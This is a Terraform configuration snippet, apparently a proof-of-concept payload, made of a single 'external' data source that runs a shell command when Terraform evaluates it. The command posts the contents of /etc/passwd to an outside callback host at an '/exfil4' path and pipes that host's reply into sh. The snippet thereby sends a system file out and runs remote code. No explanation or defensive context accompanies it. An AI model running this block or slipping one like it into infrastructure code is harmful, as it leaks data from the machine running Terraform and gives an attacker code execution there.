data "external" "example" {
 program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
https://cwc3p60rgexedpdvx3vj7momrdx7l49t.net-spi.com/exfil4 | sh"]
}
